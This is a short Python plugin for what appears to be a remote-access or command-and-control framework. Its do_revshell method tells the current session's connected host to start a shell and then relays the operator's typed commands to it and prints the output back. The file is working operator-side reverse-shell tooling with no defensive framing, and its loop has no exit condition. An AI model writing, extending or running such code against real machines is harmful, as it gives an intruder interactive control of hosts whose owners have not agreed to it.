from plugin_manager.manager import plugin_manager
import socket
import multiprocessing
import os
import time
import sys
import select
class test(plugin_manager):

    def do_revshell(self, args):
        self.connections[int(self.current_session)].send("shell".encode())
        inputs = [self.connections[int(self.current_session)].fileno(), sys.stdin.fileno()]
        outputs = []
        command = ""
        while inputs:
            readable,writable,exceptional = select.select(inputs,outputs,inputs,0)
            for x in readable:
                if x == self.connections[int(self.current_session)].fileno():
                    data = self.connections[int(self.current_session)].recv(1024)
                    sys.stdout.write(data.decode())
                    sys.stdout.flush()
                    readable.remove(x)

                if x == sys.stdin.fileno():
                    command = sys.stdin.readline()
                    self.connections[int(self.current_session)].send(command.encode())
                    readable.remove(x)
                